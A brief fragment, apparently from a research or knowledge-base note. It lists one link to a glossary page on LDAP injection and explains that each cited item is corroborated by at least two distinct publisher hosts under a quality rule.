  - <https://xygeni.io/iw/sscs-glossary/what-is-ldap-injection/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
